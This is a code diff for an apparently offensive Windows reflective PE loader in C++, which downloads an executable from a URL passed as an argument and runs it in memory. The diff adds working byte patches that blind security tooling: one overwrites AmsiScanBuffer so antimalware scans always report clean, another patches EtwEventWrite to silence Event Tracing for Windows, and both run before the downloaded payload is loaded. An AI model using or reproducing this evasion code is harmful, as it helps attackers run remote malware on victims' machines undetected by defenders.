@@ -16,7 +16,6 @@
     	rename("ReportEvent", "InteropServices_ReportEvent")	\
 		rename("or", "InteropServices_or") // rename for c# symbols to not overwrite C++ functions/symbols
 
-// TODO: AMSI bypass before loading managed
 // TODO: Module Stomping 
 // TODO: native ExitThread function exits out of current process, hook this and fix
 // TODO: parse headers and allocate straight from HTTP download 
@@ -775,38 +774,70 @@ HRESULT loadManaged(void *code, size_t len, int argc, char** argv) {
 }
 
 // patches ETW userland function, EtwEventWrite, with ret 14
-DWORD patchETW(bool arch32 = true) {
+DWORD patchETW(bool is32Bit = true) {
 	DWORD oldProt = NULL;
 	void* patchBytes = NULL;
+	int patchSize = 0;
 
 	// set correct bytes for architecture
-	if (arch32) { 
+	if (is32Bit) { 
 		// ASM: ret 14
 		patchBytes = (void*)"\xc2\x14\x00\x00"; 
+		patchSize = 4;
 	} else { 
+		// need to reverse x64 version of EtwEventWrite to get proper return instructions
 		return 1; 
 	}
 
 	// Get the EventWrite function
 	void* eventWrite = GetProcAddress(LoadLibraryA("ntdll"), "EtwEventWrite");
 	// Allow writing to page
-	VirtualProtect(eventWrite, 4, PAGE_EXECUTE_READWRITE, &oldProt);
+	VirtualProtect(eventWrite, patchSize, PAGE_EXECUTE_READWRITE, &oldProt);
 	// Patch function
-	memcpy(eventWrite, patchBytes, 4);
+	memcpy(eventWrite, patchBytes, patchSize);
 	// Return memory to original protection
-	VirtualProtect(eventWrite, 4, oldProt, &oldProt);
+	VirtualProtect(eventWrite, patchSize, oldProt, &oldProt);
+
+	return 0;
+}
+// patches AMSI AmsiScanBuffer to return AMSI_RESULT_CLEAN
+DWORD patchAMSI(bool is32Bit = true) {
+	DWORD oldProt = NULL;
+	void* patchBytes = NULL;
+	int patchSize = 0;
+
+	// set correct bytes for architecture
+	if (is32Bit) { 
+		// ASM: 
+		patchBytes = (void*)"\xB8\x57\x00\x07\x80\xC2\x18\x00"; 
+		patchSize = 8;
+	} else { 
+		patchBytes = (void*)"\xB8\x57\x00\x07\x80\xC3"; 
+		patchSize = 6;
+	}
+
+	// Get the EventWrite function
+	void* eventWrite = GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer");
+	// Allow writing to page
+	VirtualProtect(eventWrite, patchSize, PAGE_EXECUTE_READWRITE, &oldProt);
+	// Patch function
+	memcpy(eventWrite, patchBytes, patchSize);
+	// Return memory to original protection
+	VirtualProtect(eventWrite, patchSize, oldProt, &oldProt);
 
 	return 0;
 }
 
+// peBuffer is free'd using free() during loading 
 DWORD reflectiveLoadPE(char* peBuffer, int len, int argc, char** argv) {
 	IMAGE_NT_HEADERS* ntHeader = getNT(peBuffer);
 	if (ntHeader == NULL) {
 		return 1;
 	}
 
-	// patch Event Tracing for Windows
+	// patch Event Tracing for Windows and Antimalware Scan Interface
 	patchETW();
+	patchAMSI();
 
 	// check if PE is .NET
 	if (ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].Size > 0) {
@@ -826,7 +857,6 @@ int main(int argc, char* argv[])
 		printf("Usage: %s http://domain/file.exe [arg...]\n", strrchr(argv[0], '\\') ? strrchr(argv[0], '\\') + 1 : argv[0]);
 		return 0;
 	}
-	argv[1] = (char*)"http://192.168.72.1:8000/TestAppNative.exe";
 
 	// download PE from url
 	size_t peSize;
@@ -837,6 +867,5 @@ int main(int argc, char* argv[])
 	}
 
 	// call reflectiveLoader
-	// peBuffer is free'd during loading (if peBuffer is allocated using malloc, switch VirtualAlloc() to free())
 	reflectiveLoadPE(peBuffer, peSize, argc, argv);
 }
